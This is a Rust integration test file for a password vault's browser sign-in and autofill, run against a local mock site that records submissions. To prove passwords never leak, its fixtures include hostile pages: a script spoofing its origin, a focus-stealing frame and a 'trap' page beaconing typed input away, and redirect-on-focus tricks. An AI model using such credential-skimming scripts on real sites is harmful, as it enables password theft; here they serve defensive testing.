//! Flow 12 with a real browser and a local site that records everything it is sent. Skipped on a
//! machine with no Chromium-based browser.

mod support;

use std::collections::BTreeMap;
use std::fs;
use std::io::{BufRead, BufReader, Read, Write};
use std::net::{TcpListener, TcpStream};
use std::os::unix::fs::PermissionsExt;
use std::path::PathBuf;
use std::process::{Child, Command, Stdio};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use libvault::item::{Meta, Secret};
use libvault::{ErrorCode, LoginInto, Totp};
use support::{Vault, code};
use tungstenite::Message;

const PASSWORD: &str = "correct-horse-battery";
const TOTP_SECRET: &str = "JBSWY3DPEHPK3PXP";

const CHROME: &str = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome";

fn has_browser() -> bool {
    PathBuf::from(CHROME).exists()
}

/// A site with a login form. `posts` records every submission, so a test can prove what reached
/// it and what did not.
struct Site {
    port: u16,
    posts: Arc<Mutex<Vec<String>>>,
}

fn page(body: &str) -> String {
    format!("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}", body.len())
}

fn redirect(to: &str, cookie: Option<&str>) -> String {
    let cookie = cookie.map_or(String::new(), |cookie| format!("Set-Cookie: {cookie}; Path=/; HttpOnly\r\n"));
    format!("HTTP/1.1 303 See Other\r\nLocation: {to}\r\n{cookie}Content-Length: 0\r\nConnection: close\r\n\r\n")
}

fn form(fields: &str, action: &str) -> String {
    page(&format!("<!doctype html><form method=post action={action}>{fields}<button type=submit>Go</button></form>"))
}

fn fields(body: &str) -> BTreeMap<String, String> {
    body.split('&')
        .filter_map(|pair| pair.split_once('='))
        .map(|(key, value)| (key.to_owned(), value.replace("%40", "@").replace('+', " ")))
        .collect()
}

/// A page that says whatever keeps a password coming, using only what any page can do.
fn liar(saved: &str) -> String {
    let claim = format!(r#"{{"href":"{saved}","ready":true,"password":true,"code":false,"user":false,"captcha":false}}"#);
    page(&format!(
        "<!doctype html><script>JSON.stringify = () => '{claim}';\
         document.querySelector = () => document.getElementsByName('password')[0];</script>\
         <form method=post action=/stolen><input type=password name=password data-lv-field=password></form>"
    ))
}

fn answer(request_line: &str, body: &str, elsewhere: u16) -> String {
    let path = request_line.split(' ').nth(1).unwrap_or("/");
    if let Some(saved) = path.strip_prefix("/liar?saved=") {
        return liar(saved);
    }
    if path == "/moves-on-focus" {
        let trap = format!("http://127.0.0.1:{elsewhere}/trap");
        return page(&format!(
            "<!doctype html><form><input type=password name=password></form>\
             <script>document.querySelector('input').addEventListener('focus', () => {{ location.href = '{trap}'; }});</script>"
        ));
    }
    if path == "/moves-after-settling" {
        let trap = format!("http://127.0.0.1:{elsewhere}/trap");
        return page(&format!(
            "<!doctype html><form><input type=password name=password></form>\
             <script>setTimeout(() => {{ location.href = '{trap}'; }}, 330);</script>"
        ));
    }
    if path == "/with-a-frame" {
        return form(
            &format!(
                "<input name=username autocomplete=username><input type=password name=password><iframe src='http://127.0.0.1:{elsewhere}/takes-focus'></iframe>"
            ),
            "/session",
        );
    }
    if path == "/takes-focus" {
        return page(
            "<!doctype html><input id=box><script>const box = document.getElementById('box');\
             box.addEventListener('input', () => navigator.sendBeacon('/stolen', box.value));\
             addEventListener('blur', () => setTimeout(() => box.focus(), 0));\
             setInterval(() => box.focus(), 1);</script>",
        );
    }
    if path == "/keeps-the-password" {
        return form("<input name=username autocomplete=username><input type=password name=password>", "/keep-it");
    }
    if path == "/keep-it" {
        return redirect("/session-after-keeping", Some(&format!("remember={PASSWORD}; Max-Age=3600")));
    }
    if path == "/session-after-keeping" {
        return redirect("/account", Some("session=signed-in-token; Max-Age=3600"));
    }
    if path == "/slow-login" {
        std::thread::sleep(Duration::from_secs(2));
        return form("<input name=username autocomplete=username><input type=password name=password>", "/session");
    }
    if path == "/trap" {
        return page(
            "<!doctype html><form method=post action=/stolen><input name=stolen autofocus></form>\
             <script>const box = document.querySelector('input'); box.focus();\
             box.addEventListener('input', () => navigator.sendBeacon('/stolen', box.value));</script>",
        );
    }
    if let Some(port) = path.strip_prefix("/moved-to-liar?port=") {
        return redirect(&format!("http://127.0.0.1:{elsewhere}/liar?saved=http://127.0.0.1:{port}/login"), None);
    }
    let posted = fields(body);
    let code = Totp::parse(TOTP_SECRET).unwrap().now();
    match path {
        "/refused-plainly" => form("<input name=username><input type=password name=password>", "/sorry"),
        "/sorry" => page("That did not work."),
        "/login" => form("<input name=username autocomplete=username><input type=password name=password>", "/session"),
        "/session" if posted.get("password").is_some_and(|password| password == PASSWORD) => redirect("/account", Some("session=signed-in-token")),
        "/session" => form("<p>wrong</p><input name=username><input type=password name=password>", "/session"),
        "/2fa-login" => form("<input name=username><input type=password name=password>", "/2fa-session"),
        "/2fa-session" => redirect("/2fa", None),
        "/2fa" => form("<input name=code autocomplete=one-time-code>", "/2fa-check"),
        "/2fa-check" if posted.get("code") == Some(&code) => redirect("/account", Some("session=signed-in-token")),
        "/2fa-check" => form("<p>wrong</p><input name=code autocomplete=one-time-code>", "/2fa-check"),
        "/two-step" => form("<input type=email name=email>", "/two-step-password"),
        "/two-step-password" => form("<input type=password name=password>", "/session"),
        "/captcha" => page("<!doctype html><div class=g-recaptcha></div><form><input name=username><input type=password name=password></form>"),
        "/moved" => redirect(&format!("http://127.0.0.1:{elsewhere}/login"), None),
        "/account" => page("<!doctype html><h1>Signed in</h1>"),
        _ => page(""),
    }
}

fn serve(mut stream: TcpStream, elsewhere: u16, posts: &Mutex<Vec<String>>) {
    let mut reader = BufReader::new(stream.try_clone().unwrap());
    let mut request_line = String::new();
    if reader.read_line(&mut request_line).is_err() {
        return;
    }
    let mut length = 0;
    let mut line = String::new();
    while reader.read_line(&mut line).is_ok_and(|read| read > 0) && line != "\r\n" {
        if let Some(value) = line.to_ascii_lowercase().strip_prefix("content-length:") {
            length = value.trim().parse().unwrap_or(0);
        }
        line.clear();
    }
    let mut body = vec![0u8; length];
    let _ = reader.read_exact(&mut body);
    let body = String::from_utf8_lossy(&body).into_owned();
    if !body.is_empty() {
        posts.lock().unwrap().push(body.clone());
    }
    let _ = stream.write_all(answer(&request_line, &body, elsewhere).as_bytes());
}

fn site(elsewhere: u16) -> Site {
    let listener = TcpListener::bind(("127.0.0.1", 0)).unwrap();
    let port = listener.local_addr().unwrap().port();
    let posts = Arc::new(Mutex::new(Vec::new()));
    let recorded = Arc::clone(&posts);
    std::thread::spawn(move || {
        for stream in listener.incoming().flatten() {
            let recorded = Arc::clone(&recorded);
            std::thread::spawn(move || serve(stream, elsewhere, &recorded));
        }
    });
    Site { port, posts }
}

fn save(vault: &Vault, name: &str, url: String, password: &str, totp: Option<&str>) {
    let mut meta = Meta::login(name);
    meta.urls = vec![url];
    meta.username = Some("me@example.com".to_owned());
    let secret = Secret::Login { password: password.to_owned(), totp: totp.map(str::to_owned) };
    vault.client().add(None, meta, secret, false).unwrap();
}

fn state_path(vault: &Vault) -> PathBuf {
    vault.dir.path().join("session.json")
}

fn into(vault: &Vault) -> LoginInto {
    LoginInto::StateFile(state_path(vault))
}

#[test]
fn signing_in_hands_over_a_session_and_never_the_password() {
    if !has_browser() {
        return;
    }
    let (vault, site) = (Vault::new(), site(0));
    save(&vault, "Site", format!("http://127.0.0.1:{}/login", site.port), PASSWORD, None);
    let cookies = vault.client().login(None, "Site", into(&vault)).unwrap();
    assert_eq!(cookies, 1);

    let state = std::fs::read_to_string(state_path(&vault)).unwrap();
    assert!(state.contains("signed-in-token"), "{state}");
    assert!(!state.contains(PASSWORD));
    assert!(site.posts.lock().unwrap()[0].contains(PASSWORD), "the site must receive the real password");
}

#[test]
fn a_session_can_sign_in_with_no_touch() {
    if !has_browser() {
        return;
    }
    let (vault, site) = (Vault::new(), site(0));
    vault.space("project-a");
    let mut meta = Meta::login("Site");
    meta.urls = vec![format!("http://127.0.0.1:{}/login", site.port)];
    meta.username = Some("me".to_owned());
    vault.client().add(Some("project-a"), meta, Secret::Login { password: PASSWORD.to_owned(), totp: None }, false).unwrap();
    let session = vault.session("project-a", "claude");
    vault.deny_touches();
    assert_eq!(vault.session_client(&session).login(None, "Site", into(&vault)).unwrap(), 1);
    let events = {
        vault.allow_touches();
        vault.client().audit().unwrap()
    };
    assert!(events.iter().any(|event| event.action == "login" && event.actor == "claude"));
}

#[test]
fn without_a_session_signing_in_needs_a_touch() {
    if !has_browser() {
        return;
    }
    let (vault, site) = (Vault::new(), site(0));
    save(&vault, "Site", format!("http://127.0.0.1:{}/login", site.port), PASSWORD, None);
    vault.deny_touches();
    assert_eq!(code(vault.client().login(None, "Site", into(&vault))), ErrorCode::Denied);
    assert!(site.posts.lock().unwrap().is_empty());
}

#[test]
fn a_saved_code_answers_the_two_factor_step() {
    if !has_browser() {
        return;
    }
    let (vault, site) = (Vault::new(), site(0));
    save(&vault, "Site", format!("http://127.0.0.1:{}/2fa-login", site.port), PASSWORD, Some(TOTP_SECRET));
    assert_eq!(vault.client().login(None, "Site", into(&vault)).unwrap(), 1);
}

#[test]
fn a_two_factor_step_with_no_saved_code_needs_a_person() {
    if !has_browser() {
        return;
    }
    let (vault, site) = (Vault::new(), site(0));
    save(&vault, "Site", format!("http://127.0.0.1:{}/2fa-login", site.port), PASSWORD, None);
    assert_eq!(code(vault.client().login(None, "Site", into(&vault))), ErrorCode::NeedsPerson);
}

#[test]
fn a_username_page_followed_by_a_password_page_works() {
    if !has_browser() {
        return;
    }
    let (vault, site) = (Vault::new(), site(0));
    save(&vault, "Site", format!("http://127.0.0.1:{}/two-step", site.port), PASSWORD, None);
    assert_eq!(vault.client().login(None, "Site", into(&vault)).unwrap(), 1);
}

#[test]
fn a_refused_password_is_tried_once() {
    if !has_browser() {
        return;
    }
    let (vault, site) = (Vault::new(), site(0));
    save(&vault, "Site", format!("http://127.0.0.1:{}/login", site.port), "wrong-password", None);
    assert!(vault.client().login(None, "Site", into(&vault)).is_err());
    assert_eq!(site.posts.lock().unwrap().len(), 1, "retrying can lock an account");
    assert!(!state_path(&vault).exists());
    let events = vault.client().audit().unwrap();
    assert!(events.iter().any(|event| event.action == "login"), "a password was typed, so it must be on the record");
}

#[test]
fn a_captcha_is_left_to_a_person() {
    if !has_browser() {
        return;
    }
    let (vault, site) = (Vault::new(), site(0));
    save(&vault, "Site", format!("http://127.0.0.1:{}/captcha", site.port), PASSWORD, None);
    assert_eq!(code(vault.client().login(None, "Site", into(&vault))), ErrorCode::NeedsPerson);
    assert!(site.posts.lock().unwrap().is_empty());
}

#[test]
fn a_redirect_to_another_site_gets_nothing_typed_into_it() {
    if !has_browser() {
        return;
    }
    let attacker = site(0);
    let (vault, moved) = (Vault::new(), site(attacker.port));
    save(&vault, "Site", format!("http://127.0.0.1:{}/moved", moved.port), PASSWORD, None);
    let result = vault.client().login(None, "Site", into(&vault));
    assert!(result.is_err());
    assert!(attacker.posts.lock().unwrap().is_empty(), "the password reached another site");
}

#[test]
fn a_page_cannot_talk_its_way_past_the_origin_check() {
    if !has_browser() {
        return;
    }
    let attacker = site(0);
    let (vault, moved) = (Vault::new(), site(attacker.port));
    save(&vault, "Site", format!("http://127.0.0.1:{}/moved-to-liar?port={}", moved.port, moved.port), PASSWORD, None);
    let _ = vault.client().login(None, "Site", into(&vault));
    let posted = attacker.posts.lock().unwrap().join("\n");
    assert!(!posted.contains(PASSWORD), "a page that lied about its address received the password: {posted}");
}

/// A page on the saved site leaves for another the moment it is touched, or just as the sign-in has
/// decided it is settled, to have what comes next typed somewhere else.
fn typed_elsewhere(path: &str) -> String {
    let attacker = site(0);
    let (vault, home) = (Vault::new(), site(attacker.port));
    save(&vault, "Site", format!("http://127.0.0.1:{}{path}", home.port), PASSWORD, None);
    let _ = vault.client().login(None, "Site", into(&vault));
    std::thread::sleep(Duration::from_millis(300));
    attacker.posts.lock().unwrap().join("\n")
}

/// The tests below prove nothing unless that page really does catch what reaches it.
#[test]
fn the_page_those_attacks_aim_for_catches_what_is_typed() {
    if !has_browser() {
        return;
    }
    let (vault, trap) = (Vault::new(), site(0));
    save(&vault, "Site", format!("http://127.0.0.1:{}/trap", trap.port), PASSWORD, None);
    let _ = vault.client().login(None, "Site", into(&vault));
    std::thread::sleep(Duration::from_millis(300));
    let posted = trap.posts.lock().unwrap().join("\n");
    assert!(posted.contains("me@example.com"), "the trap caught nothing: {posted:?}");
}

#[test]
fn a_page_that_moves_as_its_field_is_focused_gets_nothing_typed_at_its_destination() {
    if !has_browser() {
        return;
    }
    let posted = typed_elsewhere("/moves-on-focus");
    assert!(!posted.contains(PASSWORD), "the password followed the page: {posted}");
}

#[test]
fn a_page_that_moves_just_after_settling_gets_nothing_typed_at_its_destination() {
    if !has_browser() {
        return;
    }
    for _ in 0..5 {
        let posted = typed_elsewhere("/moves-after-settling");
        assert!(!posted.contains(PASSWORD), "the password followed the page: {posted}");
    }
}

#[test]
fn a_browser_named_in_the_environment_is_never_given_a_password() {
    if !has_browser() {
        return;
    }
    let (vault, site) = (Vault::new(), site(0));
    save(&vault, "Site", format!("http://127.0.0.1:{}/login", site.port), PASSWORD, None);
    vault.client().stop().unwrap();

    // A real browser would read commands on fd 3. This one proves it was started at all.
    let marker = vault.dir.path().join("fake-browser-ran");
    let fake = vault.file("fake-browser", format!("#!/bin/sh\ntouch {}\ncat <&3 >> {}\n", marker.display(), marker.display()).as_bytes());
    fs::set_permissions(&fake, fs::Permissions::from_mode(0o755)).unwrap();
    vault.start_broker_with_env("LV_BROWSER", &fake);

    let _ = vault.client().login(None, "Site", into(&vault));
    assert!(!marker.exists(), "a process that set one variable got the broker to run its own browser");
}

#[test]
fn an_agent_browser_elsewhere_is_refused_because_a_session_stays_on_this_machine() {
    if !has_browser() {
        return;
    }
    let (vault, site) = (Vault::new(), site(0));
    save(&vault, "Site", format!("http://127.0.0.1:{}/login", site.port), PASSWORD, None);
    let result = vault.client().login(None, "Site", LoginInto::Browser("http://192.0.2.1:9222".to_owned()));
    assert_eq!(code(result), ErrorCode::Error);
}

/// A browser an agent would drive, debuggable over a local port.
struct AgentBrowser {
    child: Child,
    profile: tempfile::TempDir,
    port: u16,
    path: String,
}

impl AgentBrowser {
    #[allow(clippy::zombie_processes, reason = "Drop waits for it")]
    fn launch() -> Self {
        let profile = tempfile::tempdir().unwrap();
        let child = Command::new(CHROME)
            .args(["--headless=new", "--remote-debugging-port=0", "--no-first-run", "--no-default-browser-check"])
            .arg(format!("--user-data-dir={}", profile.path().display()))
            .arg("about:blank")
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .unwrap();
        let active = profile.path().join("DevToolsActivePort");
        for _ in 0..400 {
            let text = std::fs::read_to_string(&active).unwrap_or_default();
            let mut lines = text.lines();
            if let (Some(Ok(port)), Some(path)) = (lines.next().map(str::parse), lines.next()) {
                return Self { child, profile, port, path: path.to_owned() };
            }
            std::thread::sleep(Duration::from_millis(25));
        }
        panic!("the agent's browser never opened its port");
    }

    fn cookies(&self) -> String {
        let (mut socket, _) = tungstenite::connect(format!("ws://127.0.0.1:{}{}", self.port, self.path)).unwrap();
        socket.send(Message::text(r#"{"id":1,"method":"Storage.getCookies"}"#)).unwrap();
        loop {
            if let Message::Text(text) = socket.read().unwrap() {
                let reply: serde_json::Value = serde_json::from_str(text.as_str()).unwrap();
                if reply["id"] == 1 {
                    return reply["result"]["cookies"].to_string();
                }
            }
        }
    }
}

impl Drop for AgentBrowser {
    fn drop(&mut self) {
        let _ = self.child.kill();
        let _ = self.child.wait();
        let _ = self.profile.path();
    }
}

#[test]
fn the_session_arrives_in_the_agents_own_browser_and_the_password_does_not() {
    if !has_browser() {
        return;
    }
    let (vault, site) = (Vault::new(), site(0));
    save(&vault, "Site", format!("http://127.0.0.1:{}/login", site.port), PASSWORD, None);
    let agent = AgentBrowser::launch();
    assert!(!agent.cookies().contains("signed-in-token"));

    let cookies = vault.client().login(None, "Site", LoginInto::Browser(format!("http://127.0.0.1:{}", agent.port))).unwrap();
    assert_eq!(cookies, 1);
    let held = agent.cookies();
    assert!(held.contains("signed-in-token"), "{held}");
    assert!(!held.contains(PASSWORD));
}

// Filling for a person.

#[test]
fn fill_offers_only_what_is_saved_for_the_page() {
    let vault = Vault::new();
    save(&vault, "GitHub", "https://github.com/login".to_owned(), PASSWORD, None);
    save(&vault, "Bank", "https://bank.example/login".to_owned(), PASSWORD, None);
    let mut client = vault.client();
    let offered: Vec<String> = client.fill_options("https://github.com/x").unwrap().into_iter().map(|option| option.name).collect();
    assert_eq!(offered, ["GitHub"]);
    assert_eq!(client.fill_options("https://github.com.evil.example/x").unwrap().len(), 0);
}

#[test]
fn clicking_into_a_field_never_raises_a_prompt() {
    let vault = Vault::new();
    save(&vault, "GitHub", "https://github.com/login".to_owned(), PASSWORD, None);
    let mut client = vault.client();
    client.lock().unwrap();
    vault.deny_touches();
    assert_eq!(code(client.fill_options("https://github.com/x")), ErrorCode::Locked);
    assert!(!client.status().unwrap().unlocked);
}

#[test]
fn a_login_cannot_be_filled_on_a_page_it_is_not_saved_for() {
    let vault = Vault::new();
    save(&vault, "GitHub", "https://github.com/login".to_owned(), PASSWORD, None);
    assert_eq!(code(vault.client().fill("Personal", "GitHub", "https://evil.example/")), ErrorCode::Denied);
}

#[test]
fn filling_gives_a_current_code_never_the_two_factor_secret() {
    let vault = Vault::new();
    save(&vault, "GitHub", "https://github.com/login".to_owned(), PASSWORD, Some(TOTP_SECRET));
    let filled = vault.client().fill("Personal", "GitHub", "https://github.com/login").unwrap();
    assert_eq!(filled.code.as_deref().map(str::len), Some(6));
    assert_eq!(filled.secret, Secret::Login { password: PASSWORD.to_owned(), totp: None });
}

#[test]
fn filling_needs_a_touch_each_time_and_a_session_never_fills() {
    let vault = Vault::new();
    vault.space("project-a");
    save(&vault, "GitHub", "https://github.com/login".to_owned(), PASSWORD, None);
    let session = vault.session("project-a", "claude");
    assert_eq!(code(vault.session_client(&session).fill("Personal", "GitHub", "https://github.com/login")), ErrorCode::Denied);
    vault.deny_touches();
    assert_eq!(code(vault.client().fill("Personal", "GitHub", "https://github.com/login")), ErrorCode::Denied);
}

#[test]
fn only_logins_and_cards_can_be_filled() {
    let vault = Vault::new();
    vault.add_env("API_KEY", "the-secret", None);
    assert_eq!(code(vault.client().fill("Personal", "API_KEY", "https://example.com/")), ErrorCode::Error);
}

#[test]
fn a_refused_fill_says_nothing_about_what_exists_and_raises_no_prompt() {
    let vault = Vault::new();
    vault.space("project-a");
    let session = vault.session("project-a", "claude");
    vault.deny_touches();
    let mut client = vault.session_client(&session);
    assert_eq!(code(client.fill("Personal", "No Such Item", "https://example.com/")), ErrorCode::Denied);
    assert_eq!(code(client.fill("No Such Space", "No Such Item", "https://example.com/")), ErrorCode::Denied);
}

#[test]
fn a_frame_from_another_site_that_takes_focus_gets_nothing() {
    if !has_browser() {
        return;
    }
    let attacker = site(0);
    let (vault, home) = (Vault::new(), site(attacker.port));
    save(&vault, "Site", format!("http://127.0.0.1:{}/with-a-frame", home.port), PASSWORD, None);
    vault.client().login(None, "Site", into(&vault)).unwrap();
    std::thread::sleep(Duration::from_millis(300));
    let caught = attacker.posts.lock().unwrap().join("\n");
    assert!(!caught.contains(PASSWORD) && !caught.contains("me@example.com"), "a frame caught {caught:?}");
    assert!(home.posts.lock().unwrap().iter().any(|post| post.contains(PASSWORD)), "and the sign-in has to work");
}

#[test]
fn a_site_that_gives_no_session_was_not_signed_in_to() {
    if !has_browser() {
        return;
    }
    let (vault, home) = (Vault::new(), site(0));
    save(&vault, "Site", format!("http://127.0.0.1:{}/refused-plainly", home.port), PASSWORD, None);
    assert!(vault.client().login(None, "Site", into(&vault)).is_err());
    assert!(!state_path(&vault).exists());
}

#[test]
fn a_session_with_nowhere_to_go_stops_before_the_password_goes_out() {
    if !has_browser() {
        return;
    }
    let (vault, home) = (Vault::new(), site(0));
    save(&vault, "Site", format!("http://127.0.0.1:{}/login", home.port), PASSWORD, None);
    fs::write(state_path(&vault), "").unwrap();
    for nowhere in [
        into(&vault),
        LoginInto::StateFile("session.json".into()),
        LoginInto::Browser("http://192.0.2.1:9222".to_owned()),
        LoginInto::Browser("http://127.0.0.1:1".to_owned()),
    ] {
        assert!(vault.client().login(None, "Site", nowhere).is_err());
    }
    assert!(home.posts.lock().unwrap().is_empty(), "the password went out with nowhere for the session to go");
}

#[test]
fn a_cookie_holding_the_password_is_not_handed_over() {
    if !has_browser() {
        return;
    }
    let (vault, home) = (Vault::new(), site(0));
    save(&vault, "Site", format!("http://127.0.0.1:{}/keeps-the-password", home.port), PASSWORD, None);
    vault.client().login(None, "Site", into(&vault)).unwrap();
    let state = fs::read_to_string(state_path(&vault)).unwrap();
    assert!(!state.contains(PASSWORD), "{state}");
    assert!(state.contains("signed-in-token"), "and the session has to arrive: {state}");
}

#[test]
fn a_lock_stops_a_sign_in_that_has_started() {
    if !has_browser() {
        return;
    }
    let (vault, home) = (Vault::new(), site(0));
    save(&vault, "Site", format!("http://127.0.0.1:{}/slow-login", home.port), PASSWORD, None);
    let (mut client, target) = (vault.client(), into(&vault));
    let signing_in = std::thread::spawn(move || client.login(None, "Site", target));
    std::thread::sleep(Duration::from_millis(1000));
    vault.client().lock().unwrap();
    assert!(signing_in.join().unwrap().is_err(), "a lock always wins");
    assert!(home.posts.lock().unwrap().is_empty(), "the password went out after the lock");
    assert!(!state_path(&vault).exists(), "and so did the session");
}

#[test]
fn ending_a_grant_stops_a_sign_in_that_has_started() {
    if !has_browser() {
        return;
    }
    let (vault, home) = (Vault::new(), site(0));
    vault.space("project-a");
    let mut meta = Meta::login("Site");
    meta.urls = vec![format!("http://127.0.0.1:{}/slow-login", home.port)];
    meta.username = Some("me@example.com".to_owned());
    vault.client().add(Some("project-a"), meta, Secret::Login { password: PASSWORD.to_owned(), totp: None }, false).unwrap();
    let (token, id) = vault.client().grant(Some("project-a"), "claude", Duration::from_secs(3600), None).unwrap();
    let (mut agent, target) = (vault.session_client(&token), into(&vault));
    let signing_in = std::thread::spawn(move || agent.login(None, "Site", target));
    std::thread::sleep(Duration::from_millis(1000));
    vault.client().end_grant(&id).unwrap();
    assert!(signing_in.join().unwrap().is_err());
    assert!(!state_path(&vault).exists(), "a session went to an agent whose grant had ended");
}
